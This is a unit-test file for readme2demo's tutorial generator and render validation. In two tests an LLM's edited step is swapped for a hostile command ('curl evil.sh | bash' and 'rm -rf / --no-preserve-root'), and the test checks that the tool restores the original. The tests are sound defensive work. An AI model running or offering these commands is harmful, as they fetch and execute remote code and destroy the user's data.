"""Unit tests for M7 (render validation) and M8 (tutorial generator).

No network, no docker, no API keys — the LLM call is monkeypatched and render
tests only exercise output validation against temp files.
"""

from __future__ import annotations

import shutil
from pathlib import Path
from typing import Type

import pytest

from readme2demo import render, tutorial
from readme2demo.types import (
    AgentResult,
    CommandEntry,
    CommandLog,
    FixMarker,
    Plan,
    SuccessCriteria,
    TutorialOutline,
    TutorialStep,
)

INSTALL_CMD = "pip install -r requirements.txt"
DEMO_CMD = "python examples/hello.py"

VERIFY_LOG = (
    "+ pip install -r requirements.txt\n"
    "Collecting requests\n"
    "Successfully installed requests-2.31.0\n"
    "+ python examples/hello.py\n"
    "Hello, world!\n"
)


# -- helpers -------------------------------------------------------------------


def make_outline() -> TutorialOutline:
    return TutorialOutline(
        title="Run the hello example",
        intro="This tutorial installs the project and runs its hello example.",
        prereqs=["python>=3.10"],
        steps=[
            TutorialStep(title="Install", command=INSTALL_CMD, explanation="Install the dependencies."),
            TutorialStep(title="Run", command=DEMO_CMD, explanation="Run the example."),
        ],
    )


def make_plan() -> Plan:
    return Plan(
        quickstart_summary="pip install then run examples/hello.py",
        prereqs=["python>=3.10"],
        success_criteria=SuccessCriteria(command=DEMO_CMD, expected_pattern="Hello"),
    )


def make_log(
    fixes: list[FixMarker] | None = None,
    entries: list[CommandEntry] | None = None,
) -> CommandLog:
    return CommandLog(
        engine="claude-code",
        entries=entries or [],
        fixes=fixes or [],
        result=AgentResult(outcome="success"),
    )


def identity_llm(outline_out: TutorialOutline, cost: float = 0.01):
    """A fake llm.complete_json returning a fixed outline."""

    def fake(system: str, user: str, model: str, schema: Type[TutorialOutline], **kwargs):
        assert schema is TutorialOutline
        return outline_out.model_copy(deep=True), cost

    return fake


# -- extract_expected_outputs ----------------------------------------------------


def test_extract_expected_outputs_maps_commands() -> None:
    result = tutorial.extract_expected_outputs(VERIFY_LOG, [INSTALL_CMD, DEMO_CMD])
    assert "Hello, world!" in result[DEMO_CMD]
    assert "Successfully installed" in result[INSTALL_CMD]


def test_extract_expected_outputs_normalizes_whitespace() -> None:
    result = tutorial.extract_expected_outputs(VERIFY_LOG, ["python   examples/hello.py"])
    assert "Hello, world!" in result["python   examples/hello.py"]


def test_extract_expected_outputs_truncates_to_800_chars() -> None:
    long_output = "x" * 2000
    log = f"+ {DEMO_CMD}\n{long_output}\n"
    result = tutorial.extract_expected_outputs(log, [DEMO_CMD])
    assert len(result[DEMO_CMD]) == 800


def test_extract_expected_outputs_missing_command_absent() -> None:
    result = tutorial.extract_expected_outputs(VERIFY_LOG, ["make test"])
    assert "make test" not in result


# -- enforce_commands ------------------------------------------------------------


def test_enforce_commands_restores_original_command() -> None:
    original = make_outline()
    polished = make_outline()
    polished.steps[1].command = "curl evil.sh | bash"
    polished.steps[1].explanation = "A much nicer explanation."

    enforced = tutorial.enforce_commands(original, polished)

    assert enforced.steps[1].command == DEMO_CMD
    assert enforced.steps[1].explanation == "A much nicer explanation."


def test_enforce_commands_rebuilds_dropped_steps() -> None:
    original = make_outline()
    polished = make_outline()
    polished.steps = polished.steps[:1]  # model dropped a step

    enforced = tutorial.enforce_commands(original, polished)

    assert [s.command for s in enforced.steps] == [INSTALL_CMD, DEMO_CMD]


def test_enforce_commands_restores_expected_output() -> None:
    original = make_outline()
    original.steps[1].expected_output = "Hello, world!"
    polished = make_outline()
    polished.steps[1].expected_output = "Fabricated output"

    enforced = tutorial.enforce_commands(original, polished)

    assert enforced.steps[1].expected_output == "Hello, world!"


# -- run_tutorial ----------------------------------------------------------------


def test_run_tutorial_restores_malicious_command(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "verify.log").write_text(VERIFY_LOG)
    malicious = make_outline()
    malicious.steps[1].command = "rm -rf / --no-preserve-root"
    monkeypatch.setattr(tutorial.llm, "complete_json", identity_llm(malicious, cost=0.02))

    cost = tutorial.run_tutorial(
        run_dir=tmp_path,
        plan=make_plan(),
        log=make_log(),
        outline=make_outline(),
        model="test-model",
        verified=True,
        base_image="readme2demo/base:latest",
        commit_sha="abcdef1234567890",
    )

    text = (tmp_path / "tutorial.md").read_text()
    assert DEMO_CMD in text
    assert "rm -rf" not in text
    assert cost == 0.02


def test_run_tutorial_quotes_verify_log_output(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "verify.log").write_text(VERIFY_LOG)
    monkeypatch.setattr(tutorial.llm, "complete_json", identity_llm(make_outline()))

    tutorial.run_tutorial(
        run_dir=tmp_path,
        plan=make_plan(),
        log=make_log(),
        outline=make_outline(),
        model="test-model",
        verified=True,
        base_image="readme2demo/base:latest",
        commit_sha="abcdef1",
    )

    text = (tmp_path / "tutorial.md").read_text()
    assert "Hello, world!" in text


@pytest.mark.parametrize(
    ("verified", "must_contain", "must_not_contain"),
    [(True, "✅", "UNVERIFIED"), (False, "UNVERIFIED", "✅")],
)
def test_verified_badge(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    verified: bool,
    must_contain: str,
    must_not_contain: str,
) -> None:
    monkeypatch.setattr(tutorial.llm, "complete_json", identity_llm(make_outline()))

    tutorial.run_tutorial(
        run_dir=tmp_path,
        plan=make_plan(),
        log=make_log(),
        outline=make_outline(),
        model="test-model",
        verified=verified,
        base_image="readme2demo/base:latest",
        commit_sha="abcdef1234567890",
    )

    text = (tmp_path / "tutorial.md").read_text()
    assert must_contain in text
    assert must_not_contain not in text


# -- troubleshooting.md ----------------------------------------------------------


def test_troubleshooting_with_fixes(tmp_path: Path) -> None:
    log = make_log(
        fixes=[FixMarker(what="pin numpy<2", because="the package fails to build on numpy 2")],
        entries=[
            CommandEntry(
                cmd=INSTALL_CMD,
                exit_code=1,
                output="ERROR: Failed building wheel for oldpkg (numpy 2 incompatible)",
            ),
            CommandEntry(cmd=DEMO_CMD, exit_code=0, output="Hello, world!"),
        ],
    )

    path = tutorial.write_troubleshooting(tmp_path, log)

    text = path.read_text()
    assert "pin numpy<2" in text
    assert "fails to build on numpy 2" in text
    assert "Failed building wheel" in text


def test_troubleshooting_no_fixes(tmp_path: Path) -> None:
    path = tutorial.write_troubleshooting(tmp_path, make_log())

    text = path.read_text()
    assert "worked as written" in text


# -- render.validate_outputs -----------------------------------------------------


def test_validate_outputs_passes_without_ffprobe(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(shutil, "which", lambda name: None)
    mp4 = tmp_path / "demo.mp4"
    gif = tmp_path / "demo.gif"
    mp4.write_bytes(b"\0" * (11 * 1024))
    gif.write_bytes(b"\0" * (11 * 1024))

    valid = render.validate_outputs(tmp_path)

    assert set(valid) == {mp4, gif}


def test_validate_outputs_missing_files_raise(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(shutil, "which", lambda name: None)
    with pytest.raises(render.RenderError, match="missing"):
        render.validate_outputs(tmp_path)


def test_validate_outputs_too_small_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(shutil, "which", lambda name: None)
    (tmp_path / "demo.mp4").write_bytes(b"\0" * 100)
    with pytest.raises(render.RenderError, match="too small"):
        render.validate_outputs(tmp_path)


# -- generated step_by_step.md ------------------------------------------------------


def _sbs_fixture(tmp_path):
    from readme2demo.types import (
        AgentResult, CommandLog, Plan, SuccessCriteria,
        TutorialOutline, TutorialStep,
    )

    (tmp_path / "commands.sh").write_text(
        "#!/usr/bin/env bash\n"
        "set -euxo pipefail\n"
        "export DEBIAN_FRONTEND=noninteractive\n"
        "\n"
        "# --- readme2demo preamble (harness-injected): fresh-container setup ---\n"
        "cd /work\n"
        "git clone --depth 1 https://github.com/x/y .\n"
        "\n"
        "pip install -r requirements.txt\n"
        "python examples/hello.py\n"
        "\n"
        "# --- readme2demo success-criteria assertion ---\n"
        'r2d_output="$(python examples/hello.py 2>&1)"\n'
        'echo "R2D_VERIFY_OK"\n'
    )
    (tmp_path / "verify.log").write_text(
        "+ python examples/hello.py\nHello from acme!\n"
    )
    outline = TutorialOutline(
        title="Quickstart",
        intro="A tiny demo.",
        steps=[TutorialStep(title="Run the example", command="python examples/hello.py",
                            explanation="Runs the bundled example.")],
    )
    log = CommandLog(engine="claude-code", result=AgentResult(outcome="success"))
    plan = Plan(
        quickstart_summary="run hello",
        success_criteria=SuccessCriteria(command="python examples/hello.py"),
        prereqs=["python>=3.10"],
    )
    return plan, outline, log


def test_write_step_by_step_grounded_in_commands_sh(tmp_path):
    from readme2demo.tutorial import write_step_by_step

    plan, outline, log = _sbs_fixture(tmp_path)
    dest = write_step_by_step(tmp_path, plan, outline, log, verified=True)
    text = dest.read_text()
    # every non-preamble script command appears as a step, in order
    assert text.index("git clone --depth 1") < text.index("pip install") < text.index(
        "python examples/hello.py"
    )
    # assertion block excluded
    assert "R2D_VERIFY_OK" not in text
    assert "r2d_output" not in text
    # outline title/explanation used where the command matches
    assert "Run the example" in text
    assert "Runs the bundled example." in text
    # expected output pulled from verify.log
    assert "Hello from acme!" in text
    # verified badge
    assert "✅" in text


def test_write_step_by_step_unverified_badge(tmp_path):
    from readme2demo.tutorial import write_step_by_step

    plan, outline, log = _sbs_fixture(tmp_path)
    text = write_step_by_step(tmp_path, plan, outline, log, verified=False).read_text()
    assert "UNVERIFIED" in text


# -- SEO / GEO shape of generated artifacts ------------------------------------------


def test_seo_title_and_description():
    from readme2demo.tutorial import seo_description, seo_title

    assert seo_title("https://github.com/stacklok/toolhive", "fallback") == (
        "How to install and run stacklok/toolhive — verified tutorial"
    )
    assert seo_title("", "My fallback") == "My fallback"
    desc = seo_description("ToolHive manages MCP servers. It does more things.")
    assert desc.startswith("ToolHive manages MCP servers.")
    assert len(desc) <= 160
    assert len(seo_description("x" * 400)) <= 160


def test_tutorial_md_front_matter_and_provenance(tmp_path, monkeypatch):
    import json as _json

    from readme2demo import llm as llm_mod
    from readme2demo.tutorial import run_tutorial
    from readme2demo.types import (
        AgentResult, CommandLog, Plan, SuccessCriteria, TutorialOutline,
        TutorialStep,
    )

    outline = TutorialOutline(
        title="Quickstart",
        intro="A tiny demo.",
        steps=[TutorialStep(title="Run", command="./run.sh", explanation="Runs it.")],
    )
    monkeypatch.setattr(
        llm_mod, "complete_json", lambda *a, **k: (outline.model_copy(deep=True), 0.01)
    )
    plan = Plan(
        quickstart_summary="q",
        success_criteria=SuccessCriteria(command="./run.sh"),
        prereqs=["bash"],
    )
    log = CommandLog(engine="claude-code", result=AgentResult(outcome="success"))
    run_tutorial(
        tmp_path, plan, log, outline, "m", verified=True, base_image="img",
        commit_sha="879865dabcdef", repo_url="https://github.com/stacklok/toolhive",
    )
    text = (tmp_path / "tutorial.md").read_text()
    assert text.startswith("---\n")  # YAML front matter for static-site pipelines
    assert 'title: "How to install and run stacklok/toolhive — verified tutorial"' in text
    assert "verified: true" in text
    assert 'source_repo: "https://github.com/stacklok/toolhive"' in text
    assert "879865d" in text  # provenance: short sha in footer
    assert "https://github.com/stacklok/toolhive" in text.split("---")[-1]  # source link in footer

    # schema.org HowTo structured data emitted alongside
    doc = _json.loads((tmp_path / "howto.jsonld").read_text())
    assert doc["@type"] == "HowTo"
    assert doc["isBasedOn"] == "https://github.com/stacklok/toolhive"
    assert doc["creativeWorkStatus"] == "verified"
    assert doc["step"][0]["itemListElement"][0]["text"] == "./run.sh"

    # generated step_by_step.md carries front matter too
    sbs = (tmp_path / "step_by_step.md").read_text()
    assert sbs.startswith("---\n")
    assert "generator: readme2demo" in sbs


def test_guide_front_matter_does_not_break_tape_parsing(tmp_path):
    from readme2demo.distill import parse_guide_steps

    guide = (
        "---\n"
        'title: "How to install and run x/y — verified tutorial — step by step"\n'
        "generator: readme2demo\n"
        "---\n\n"
        "# T — step by step\n\n### Step 1 — Run\n\n```bash\n./run.sh\n```\n"
    )
    assert [c for _, c in parse_guide_steps(guide)] == ["./run.sh"]


# -- render completeness gates --------------------------------------------------------


TAPE_TEXT = """Output demo.mp4
Set TypingSpeed 50ms
Type "cd /work && clear"
Enter
Wait
Type "# Get the source code"
Enter
Sleep 800ms
Type "git clone --depth 1 https://github.com/x/y ."
Enter
Wait
Sleep 3.0s
Type "./bin/thv version"
Enter
Wait
Sleep 3.0s
Sleep 3s
"""


def test_expected_min_duration_counts_sleeps_and_typing():
    from readme2demo.render import expected_min_duration_s

    d = expected_min_duration_s(TAPE_TEXT)
    # sleeps: 0.8 + 3 + 3 + 3 = 9.8s, plus typing time for 4 Type lines
    assert d > 9.8
    assert d < 20


def test_validate_outputs_rejects_short_video(tmp_path, monkeypatch):
    from readme2demo import render as render_mod

    (tmp_path / "demo.mp4").write_bytes(b"\x00" * 20_000)
    (tmp_path / "demo.gif").write_bytes(b"\x00" * 20_000)
    monkeypatch.setattr(render_mod.shutil, "which", lambda _: "/usr/bin/ffprobe")
    monkeypatch.setattr(render_mod, "_mp4_duration_s", lambda p, f: 6.0)
    with pytest.raises(render_mod.RenderError, match="did not play every step"):
        render_mod.validate_outputs(tmp_path, min_duration_s=60.0)


def test_validate_outputs_accepts_full_length_video(tmp_path, monkeypatch):
    from readme2demo import render as render_mod

    (tmp_path / "demo.mp4").write_bytes(b"\x00" * 20_000)
    (tmp_path / "demo.gif").write_bytes(b"\x00" * 20_000)
    monkeypatch.setattr(render_mod.shutil, "which", lambda _: "/usr/bin/ffprobe")
    monkeypatch.setattr(render_mod, "_mp4_duration_s", lambda p, f: 240.0)
    paths = render_mod.validate_outputs(tmp_path, min_duration_s=60.0)
    assert len(paths) == 2


def test_check_render_image_error_message(monkeypatch):
    import subprocess

    from readme2demo import render as render_mod

    monkeypatch.setattr(
        render_mod.subprocess, "run",
        lambda *a, **k: subprocess.CompletedProcess(a, 127, stdout="", stderr="vhs: not found"),
    )
    with pytest.raises(render_mod.RenderError, match="Rebuild it"):
        render_mod.check_render_image("readme2demo/base:latest")


def test_run_render_timeout_reports_actual_base_image(tmp_path, monkeypatch):
    """Regression: timeout errors named the unused stock VHS image."""
    import subprocess

    from readme2demo.config import Config

    actual_image = "example/render-base:issue-36"
    (tmp_path / "demo.tape").write_text("Output demo.mp4\n")
    monkeypatch.setattr(render, "check_render_image", lambda _: None)

    def time_out(cmd, **kwargs):
        raise subprocess.TimeoutExpired(cmd=cmd, timeout=kwargs["timeout"])

    monkeypatch.setattr(render.subprocess, "run", time_out)

    with pytest.raises(render.RenderError) as exc_info:
        render.run_render(tmp_path, Config(base_image=actual_image))

    assert actual_image in str(exc_info.value)
    assert "ghcr.io/charmbracelet/vhs:latest" not in str(exc_info.value)


def test_step_by_step_keeps_heredoc_as_one_step(tmp_path):
    from readme2demo.tutorial import write_step_by_step
    from readme2demo.types import (
        AgentResult, CommandLog, Plan, SuccessCriteria, TutorialOutline,
    )

    (tmp_path / "commands.sh").write_text(
        "#!/usr/bin/env bash\n"
        "set -euxo pipefail\n"
        "export DEBIAN_FRONTEND=noninteractive\n\n"
        "cd /work\n"
        "git clone --depth 1 https://github.com/x/y .\n\n"
        "cat > /tmp/demo/main.tf <<'EOF'\n"
        "# not a comment to skip — heredoc body\n"
        "resource \"x\" \"y\" {}\n"
        "EOF\n"
        "tfdrift scan\n\n"
        "# --- readme2demo success-criteria assertion ---\n"
        'echo "R2D_VERIFY_OK"\n'
    )
    plan = Plan(quickstart_summary="q",
                success_criteria=SuccessCriteria(command="tfdrift scan"))
    log = CommandLog(engine="claude-code", result=AgentResult(outcome="success"))
    text = write_step_by_step(
        tmp_path, plan, TutorialOutline(title="T", intro="I."), log, verified=True
    ).read_text()
    # heredoc is ONE step: body inside the same code block, not separate steps
    assert text.count("cat > /tmp/demo/main.tf") == 1
    body_pos = text.index('resource "x" "y" {}')
    cat_pos = text.index("cat > /tmp/demo/main.tf")
    next_step_pos = text.index("tfdrift scan")
    assert cat_pos < body_pos < next_step_pos
    # the heredoc body's comment line was not filtered out
    assert "# not a comment to skip" in text


# -- guide detail regressions (tfdrift run) -------------------------------------------


def test_success_command_becomes_final_payoff_step(tmp_path):
    """Regression: `tfdrift scan` lived only in the assertion block, so the
    guide ended at `--version` and never showed the actual demo."""
    from readme2demo.tutorial import write_step_by_step
    from readme2demo.types import (
        AgentResult, CommandEntry, CommandLog, Plan, SuccessCriteria,
        TutorialOutline,
    )

    (tmp_path / "commands.sh").write_text(
        "#!/usr/bin/env bash\nset -euxo pipefail\n"
        "pip install --break-system-packages tfdrift\n"
        "tfdrift --version\n\n"
        "# --- readme2demo success-criteria assertion ---\n"
        'echo "R2D_VERIFY_OK"\n'
    )
    plan = Plan(
        quickstart_summary="q",
        success_criteria=SuccessCriteria(
            command="tfdrift scan --path /tmp/demo",
            expected_pattern="[Dd]rift detected",
            description="Scans the workspace and reports drifted resources.",
        ),
    )
    log = CommandLog(
        engine="claude-code",
        entries=[
            CommandEntry(
                cmd="tfdrift scan --path /tmp/demo 2>&1 | head -30",
                exit_code=0,
                output="\x1b[1mDrift detected: 2 resource(s)\x1b[0m",
            )
        ],
        result=AgentResult(outcome="success"),
    )
    text = write_step_by_step(
        tmp_path, plan, TutorialOutline(title="T", intro="I."), log, verified=True
    ).read_text()
    # the scan is a numbered step now, with title, description, and REAL output
    assert "The payoff — see it work" in text
    assert "tfdrift scan --path /tmp/demo" in text
    assert "Scans the workspace and reports drifted resources." in text
    assert "Drift detected: 2 resource(s)" in text
    assert "\x1b" not in text  # ANSI stripped
    # payoff paragraph is one clean sentence, no dangling period
    assert "demonstrates the tool doing its job." in text
    assert "working\n." not in text


def test_extract_expected_outputs_skips_nested_xtrace():
    """Regression: `++ tfdrift scan ...` (nested expansion trace) leaked into
    the previous step's expected output."""
    from readme2demo.tutorial import extract_expected_outputs

    log = (
        "+ tfdrift --version\n"
        "tfdrift, version 0.2.5\n"
        "++ tfdrift scan --path /tmp/tfdrift-demo\n"
        "+ r2d_output=whatever\n"
    )
    out = extract_expected_outputs(log, ["tfdrift --version"])
    assert out["tfdrift --version"] == "tfdrift, version 0.2.5"


def test_fallback_titles_heredoc_and_subcommand():
    from readme2demo.tutorial import _fallback_step_title

    assert _fallback_step_title(
        "cat > /tmp/tfdrift-demo/main.tf <<'EOF'\nx\nEOF"
    ) == "Create `/tmp/tfdrift-demo/main.tf`"
    assert _fallback_step_title("terraform init") == "Run `terraform init`"
    assert _fallback_step_title("export PATH=/x:$PATH") == "Set up the environment"
